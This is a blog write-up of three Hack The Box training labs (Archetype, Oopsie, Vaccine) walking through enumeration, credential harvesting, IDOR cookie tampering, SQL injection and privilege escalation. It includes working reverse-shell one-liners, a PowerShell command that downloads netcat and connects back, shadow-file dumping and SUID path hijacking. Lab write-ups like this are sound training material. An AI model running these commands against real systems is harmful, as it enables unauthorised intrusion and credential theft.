---
title: 'HTB Starting Point - Tier 2'
description: 'Hack the Box Starting Point'
pubDate: 'Dec 13 2024'
heroImage: '/blog-placeholder-1.jpg'
---

Topics covered:  
* XXE
* IDOR
* Log4J
* Cookie manipulation
* PrivEsc
* LXD for privileged filesystem access


## Archetype
*MSSQL, SMB, PS1, RCE*

**Task 1**  
Which TCP port is hosting a database server?

```bash
kali$ nmap -sV $TARGET --min-rate=2000

PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

Looks like the answer is 1433.

From the list above:
* 135: RPC. (Low level and insecure network comms to invoke a remote procedure)
* 139: Typically used by SMB to communicate with old devices. This is for SMB over NBT (NetBIOS over TCP/IP)
* 445: SMB server

This [stack overflow answer](https://superuser.com/a/694480) provides a great summary of the relationship between SMB and NetBIOS. In short: SMB and NetBIOS are different protocols, however to support legacy Windows systems, SMB can use the NetBIOS API to talk with older machines. See the diagram in the link.


**Task 2**  
What is the name of the non-Administrative share available over SMB?

```bash
kali$ smbclient -L $TARGET -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
```

Looks like it is `backups`. (N.b. admin shares typically have a `$` suffix)


**Task 3**  
What is the password identified in the file on the SMB share?

```bash
kali$ smbclient //$TARGET/backups

smb: \> ls
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020
		5056511 blocks of size 4096. 2522480 blocks available

smb: \> print prod.dtsConfig
NT_STATUS_ACCESS_DENIED opening remote file prod.dtsConfig

smb: \> get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
```

No permissions were allowed to print the file, however I could use get instead. By reading the file contents, we find this spicy connection string with these credentials `ARCHETYPE\sql_svc; M3g4c0rp123`

```xml
 <ConfiguredValue>
    Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;
</ConfiguredValue>
 ```


**Task 4**  
What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?

Impacket is designed to deal with network packets, "providing low-level programmatic access". Looking through the [repo](https://github.com/fortra/impacket/tree/master), I can see `mssqlshell.py` and `mssqlattack.py` example files. The attack utilises the shell script. (N.b. These are classes, not scripts! :facepalm:). Looks like the script I'm after is `mssqlclient`. In Kali, this is already installed and on the path. It can be executed by `impacket-mssqlclient`.

```bash
kali$ impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@$TARGET -windows-auth
```

> We need the `-windows-auth` flag because the account belongs to the machine, not to the SQL service. As per the help menu: "this flag is specified to use Windows Authentication". It's like when you run a DB on your windows machine - there is often a default provisioned account specific to SQL, alternatively, you can authenticate to the DB via your machine/domain controller.

**Task 5**  
What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?

[`xp_cmdshell`](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16)


**Task 6**  
What script can be used in order to search possible paths to escalate privileges on Windows hosts?

`winpeas` apparently :shrug:


**Task 7**  
What file contains the administrator's password?

At this point, I can execute commands via `xp_cmdshell`. It seems pertinent to create a reverse shell. This will allow us a more stable connection and remove the need to type `xp_cmdshell` on every line. From the writeups I researched online, it seems like the answer to this question only comes by solving the next two tasks (including obtaining a reverse shell, looking for privesc opportunities, and the like). After all of that, the answer is `ConsoleHost_History.txt` in the `~/AppData/Roaming/...PSReadline/` folder


**Task 8**  
Submit user flag

```
# Kali
kali$ python3 -m http.server 80 &
kali$ nc -lvnp 443

# mssql client
mssql> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget 10.10.15.212/nc.exe -outfile nc.exe; .\nc.exe -e cmd.exe 10.10.15.212 443"

# Kali netcat session (reverse shell)
C:\Users\sql_svc\Downloads> type ..\Desktop\user.txt
3e7b102e78218e935bf3f4951fec21a3
```

**Task 9**  
Submit root flag

Now that we have a reverse shell, we can download winPEAS from our attacking machine

```
C:\Users\sql_svc\Downloads> powershell -c wget http://10.10.15.212/winPEASx64.exe -outfile winPEASx64.exe
C:\Users\sql_svc\Downloads> .\winPEASx64.exe
```

Looking through the output of winPEAS, we can take a look for anything interesting that we could easily leverage. Unfortunately for me, unlike the writeup for the box, winPEAS did not suggest the `ConsoleHost_History.txt` file. In any case, looking at the file, we find some credentials, as seen below. To gain admin, we can use the `runas` command

```cmd
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine>type ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

From here, I tried to make use of a `runas` command, however it would not let me type in a password. As a result, I instead used impacket's `psexec` script.

```
kali$ impacket-psexec administrator@$TARGET

Password: ***

C:\Windows\system32> whoami
nt authority\system
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
b91ccec3305e98240082d4474b848528
```


## Oopsie
**PHP, Apache, Insecure Direct Object Reference, Authentication bypass**

**Task 1**  
With what kind of tool can intercept web traffic?  

`proxy`


**Task 2**  
What is the path to the directory on the webserver that returns a login page?  

NMAP
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-27 19:42 EST
Nmap scan report for 10.129.95.191
Host is up (0.31s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.56 seconds
```

There is a web server on port 80. Let's enumerate the web directories with gobuster

```
kali$ gobuster dir -u $TARGET -w ~/Documents/git/SecLists/Discovery/Web-Content/common.txt
kali$ gobuster dir -u $TARGET -w ~/Documents/git/SecLists/Discovery/Web-Content/Logins.fuzz.txt
```

Unfortunately neither of these yielded results. From looking at the writeup, they mention that Burpsuite can create a sitemap for you. Let's take that idea of a web crawler and use another tool in Kali: `gospider`:

```
kali$ gospider -s http://$TARGET -o site-crawl
[url] - [code-200] - http://10.129.95.191
[javascript] - http://10.129.95.191/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js
[javascript] - http://10.129.95.191/js/min.js
[javascript] - http://10.129.95.191/cdn-cgi/login/script.js
[javascript] - http://10.129.95.191/js/index.j
```

We see the directory `cdn-cgi/login` contains a login script. Visiting the page we are met with a login prompt

**Task 3**  
What can be modified in Firefox to get access to the upload page?  

After logging in as guest on `http://$TARGET/cdn-cgi/login`, we are granted access to a web portal for MegaCorp Automotive - Repair Management System.

![Guest access to the Repair Management System](/public/img/blog/htb-starting-point/oopsie-guest-access.png)

Inspecting the cookies, we see the following values. If we can find the user id for the super admin, we may be able to get access to the uploads page. 
```
role=guest
user=2233
```

From here, we notice that the Accounts page is vulnerable to insecure direct object reference - so we can iterate through the account ids in order to find our admin user and obtain their user id. The guest user has an id of `2`. Decrementing that to `1`, we find the details for the admin: user id `34322`. Let's exploit!

```
role=guest
user=34322
```

Success!
![Guest access to the Repair Management System](/public/img/blog/htb-starting-point/oopsie-uploads-access.png)


**Task 4**  
What is the access ID of the admin user?  

`34322` as per the above


**Task 5**  
On uploading a file, what directory does that file appear in on the server?  

Uploading a random txt file, let's go hunting.
```
kali$ gobuster fuzz -u $TARGET/FUZZ/nmap.txt -c user=34322 -w ~/Documents/git/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
```

Unfortunately the above returned 404 on every option. Let's simplify a bit and just enumerate directories in case there is some web server logic blocking us from accessing the file.

```
kali$ gobuster dir -x php -u $TARGET -w ~/Documents/git/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.95.191
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/Documents/git/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 10932]
/images               (Status: 301) [Size: 315] [--> http://10.129.95.191/images/]
/themes               (Status: 301) [Size: 315] [--> http://10.129.95.191/themes/]
/uploads              (Status: 301) [Size: 316] [--> http://10.129.95.191/uploads/]
/css                  (Status: 301) [Size: 312] [--> http://10.129.95.191/css/]
/js                   (Status: 301) [Size: 311] [--> http://10.129.95.191/js/]
Progress: 2150 / 175330 (1.23%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 2160 / 175330 (1.23%)
===============================================================
Finished
===============================================================
```

There appears to be an `uploads` folder sitting behind some authentication. This auth may explain the 404 behaviour from earlier. In any case, when trying to access the file such as `/uploads/nmap.txt`, the server may still try to read or invoke the file. As such, let's try upload a PHP reverse shell in the hopes it gets executed.

```php
<?php
    exec("/bin/bash -c 'bash -i >& /dev/tcp/<IP/1337> 0>&1'");
?>
```

We set up a netcat listener on our machine, and try to request the file from the web server. After trying with my basic payload, it hasn't worked. This is quite possibly due to PHP configuration settings that limit the use of functions like `exec()`. TODO: Confirm this is the case by uploading different payloads (e.g. GET request to attacking machine web server). Anyway, I went back to the drawing board and decided to use something someone smarter than me wrote - something that comes with Kali by default: `/usr/share/webshells/php/php-reverse-shell.php` and... success!

```
kali$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.15.212] from (UNKNOWN) [10.129.95.191] 47768
Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 08:41:34 up 9 min,  0 users,  load average: 0.00, 0.04, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

We have a foothold!


**Task 6**  
What is the file that contains the password that is shared with the robert user?  

The web server directory appears to be at `/var/www/html`. Doing some digging, we find the password at:

```
$ cat /var/www/html/cdn-cgi/login/db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

**Task 7**  
What executable is run with the option "-group bugtracker" to identify all files owned by the bugtracker group?  

```bash
$ find / -group bugtracker 2>/dev/null
/usr/bin/bugtracker
```

**Task 8**  
Regardless of which user starts running the bugtracker executable, what's user privileges will use to run?  

```bash
$ ls -l /usr/bin/bugtracker
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
```

It's using a set bit! This program is owned by root and because of the set bit, it will be executed by the root user


**Task 9**  
What SUID stands for?  

`set owner user ID`.

The `setuid` command means when a program is executed, it will execute as the owner of the file.


**Task 10**  
What is the name of the executable being called in an insecure manner?  

Looking through the bugtracker binary, we see a string that invokes `cat`. Perhaps we can utilise this to dump the /etc/shadow file.

**Task 11**  
Submit user flag  

From our foothold in task 5: 

```
$ cat /home/robert/user.txt
f2c74ee8db7983851ab2a96a44eb7981
```


**Task 12**  
Submit root flag  

In task 6, we found some credentials for the user `robert\M3g4C0rpUs3r!`. Inspecting the groups, we see `robert` has permission to run the bugtracker program. We can use this to escalate:

```bash
$ cat /etc/groups
...
bugtracker:x:1001:robert
```

Let's ssh into the machine as Robert and try to escalate:

```bash
kali$ ssh robert@$TARGET
...

robert@oopsie$ whoami
robert
robert@oopsie$ pwd
/home/robert
robert@oopsie$ bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 2
---------------

If you connect to a site filezilla will remember the host, the username and the password (optional). The same is true for the site manager. But if a port other than 21 is used the port is saved in .config/filezilla - but the information from this file isn't downloaded again afterwards.

ProblemType: Bug
DistroRelease: Ubuntu 16.10
Package: filezilla 3.15.0.2-1ubuntu1
Uname: Linux 4.5.0-040500rc7-generic x86_64
ApportVersion: 2.20.1-0ubuntu3
Architecture: amd64
CurrentDesktop: Unity
Date: Sat May 7 16:58:57 2016
EcryptfsInUse: Yes
SourcePackage: filezilla
UpgradeStatus: No upgrade log present (probably fresh install)
```

The use of `cat` in the bugtracker binary seems to look for a file with the prefix `/root/reports/D`. If the validation is not performed correctly, we can try and dump other files. Let's POC it with the user.txt file:

```

robert@oopsie$ bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: ../../home/robert/user.txt
---------------

f2c74ee8db7983851ab2a96a44eb7981

*** stack smashing detected ***: <unknown> terminated
Aborted (core dumped)
```

Success! The stack smashing is probably due to the fact the filepath input was longer than any expected Bug ID. With this, let's dump the shadow file!

```bash
robert@oopsie:~$ bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: ../../etc/shadow
---------------

root:$6$eD0n5saZ$orykpdd7mVL/lF57rIGwUzeSROPC1KRITJ45Nqn6P2BLaZ.tcSOy5fNFcOw9uBRkClgu5R9WlyxpEId5qOOVY.:18285:0:99999:7:::
...
robert:$6$kriHoPwv$iBt45Fu0g4R0uNWSubfjDRvtUSwxVu.U1JhYKmT4voMWlVc3/u2nu0j0JZL0YWmm62vRgAs4acBl8Ge.S393H/:18285:0:99999:7:::
```

Awesome. Time to whip out John the Ripper

```bash
kali$  john root-shadow.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

... Well, that didn't yield any results sadly. Another idea is to perform command injection when bugtracker asks for an ID. e.g.

```
robert@oopsie:~$ bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 2 | /bin/bash -i
---------------

```

No dice unfortunately. After these few attempts, I made a quick reference to the writeup. Looks like the insecure use of `cat` was that it didn't specify the filepath. This means we could manipulate the path to execute some program called `cat` as root and gain a shell. 


```
robert@oopsie:/tmp$ cd /tmp
robert@oopsie:/tmp$ echo "/bin/bash" > cat
robert@oopsie:/tmp$ chmod a+x cat
robert@oopsie:/tmp$ ls -l
-rwxrwxr-x 1 robert robert   10 Jan 31 09:39 cat
robert@oopsie:/tmp$ which cat
/tmp/cat
robert@oopsie:/tmp$ bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 2
---------------

root@oopsie:/tmp# whoami
root
root@oopsie:/tmp# less /root/root.txt
af13b0bee69f8a877c3faf667f7beacf
```

Job done!


## Vaccine
*Postgres, PHP, SQLi*

**Task 1**  
Besides SSH and HTTP, what other service is hosted on this box?  

FTP as per nmap scan

```bash
kali$ nmap -sC $TARGET --min-rate=2000 | tee nmap-sc.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-05 11:13 AEDT
Nmap scan report for 10.129.95.174
Host is up (0.36s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.15.41
|      Logged in as ftpuser
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
22/tcp open  ssh
| ssh-hostkey:
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: MegaCorp Login

Nmap done: 1 IP address (1 host up) scanned in 17.06 seconds
```

**Task 2**  
This service can be configured to allow login with any password for specific username. What is that username?  

`anonymous`

**Task 3**  
What is the name of the file downloaded over this service?  

`backup.zip`

```bash
kali$ ftp $TARGET
Connected to 10.129.95.174.
220 (vsFTPd 3.0.3)
Name (10.129.95.174:malachi): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||10511|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
226 Directory send OK.
ftp> get backup.zip
local: backup.zip remote: backup.zip
229 Entering Extended Passive Mode (|||10450|)
150 Opening BINARY mode data connection for backup.zip (2533 bytes).
100% |*************************************************************************************************************************************|  2533      489.24 KiB/s    00:00 ETA
226 Transfer complete.
2533 bytes received in 00:00 (6.83 KiB/s)
ftp> pwd
Remote directory: /
```


**Task 4**  
What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?  

`zip2john`

**Task 5**  
What is the password for the admin user on the website?  

1. Use John to crack zip (password: `741852963`)
2. Read index file and we find md5 hash of admin password (md5: `2cb42f8734ea607eefed3b70af13bbd3`)
3. Lookup unsalted md5 reverse to get `qwerty789` for user `admin`

**Task 6**  
What option can be passed to sqlmap to try to get command execution via the sql injection?  

Given we have an admin password to the PHP site, let's take a look at the website and peek around for any potential vulnerabilities. Upon logging in, we are granted with a dashboard with a search bar. That search appears to be the only interactive functionality. Let's have a play around. Aha! Typing `a'` gives us a SQL error

```sql
ERROR: unterminated quoted string at or near "'" LINE 1: Select * from cars where name ilike '%a'%'^
```

At this point, we have an unsanitised input for SQLi at the endpoint `http://$TARGET/dashboard.php?search=<something>`

Looking at the `sqlmap` options, the `--os-shell` looks pretty good.


**Task 7**  
What program can the postgres user run as root using sudo?  

First, let's gain access to the machine. 

```bash
kali$ sqlmap --os-shell -u http://$TARGET/dashboard.php?search=abc --cookie=PHPSESSID=<session id>
...
it looks like the back-end DMBS is 'PostgreSQL'
...
[09:26:14] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Ubuntu 20.10 or 19.10 or 20.04 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: PostgreSQL
[09:26:17] [INFO] fingerprinting the back-end DBMS operating system
[09:26:19] [INFO] the back-end DBMS operating system is Linux
[09:26:20] [INFO] testing if current user is DBA
[09:26:21] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
[09:26:21] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> whoami
command standard output: 'postgres'
os-shell> pwd
command standard output: '/var/lib/postgresql/11/main'
```

Let's establish a more stable shell

```
os-shell> /bin/bash -c 'bash -i >& /dev/tcp/<IP>/1337 0>&1'
...
kali$ nc -lvnp 1337
postgres@vaccine:/var/lib/postgresql/11/main$
```

At this point, I was having some issues with the question. When trying to find permissions by `sudo -l`, I was getting hit with "sudo: a terminal is required to read the password". At this point, I returned to the writeup which showed that while this bash reverse shell was more stable, it wasn't enough - we needed a stable shell.

```
postgres@vaccine:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Even still, trying to use the command `sudo -l` was prompting for a password. I did go to the writeup for a hint - it said to look in the `/var/www/html` directory where the site was. If there were some creds stored in the PHP files, there could possible be some SQL things too. We know the dashboard is retrieving data from somewhere. Let's look at that:

```php
$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
```

Excellent! Looks like exactly what we're after.

```bash
postgres@vaccine:/var/www/html$ sudo -l
sudo -l
[sudo] password for postgres: P@s5w0rd!

Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

The user can run `vi` as root. (n.b. it can run as root to edit that specific file. I didn't realise that at first)


**Task 8**  
Submit user flag  

From spawning a stable shell in task 7:
```bash
postgres@vaccine:/var/lib/postgresql/11/main$ cd ~
cd ~
postgres@vaccine:/var/lib/postgresql$ ls
ls
11  user.txt
postgres@vaccine:/var/lib/postgresql$ cat user.txt
cat user.txt
ec9b13ca4d6229cd5cc1e09980965bf7
```


**Task 9**  
Submit root flag  

In vi, we can get a shell by `:sh`. Doing so after opening the file with sudo gives us a root shell

```bash
postgres@vaccine$ sudo vi /etc/postgresql/11/main/pg_hba.conf
password for postgres: ...

# vim
:sh
wroot@vaccine#whoami
whoami
root
root@vaccine# cd ~
root@vaccine:~# ls
ls
pg_hba.conf  root.txt  snap
root@vaccine:~# cat root.txt
cat root.txt
dd6e058e814260bc70e9bbdef2715849
```



Todo: Write up about failed `find` attempt

find /usr 2>/dev/null -type f -perm /4000 - failed attempt to find permissions


sqlmap --os-shell -u http://$TARGET/dashboard.php?search=abc --cookie=PHPSESSID=v6bd1717a43omas1b6r01rvgbg --timeout 1800
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.44/5009 0>&1'
python3 -c 'import pty;pty.spawn("/bin/bash")'
sudo vi /etc/postgresql/11/main/pg_hba.conf


Todo: write up about the use of sudo with the SUID. I wouldn't have got that without the writeup
https://gtfobins.github.io/gtfobins/vi/#sudo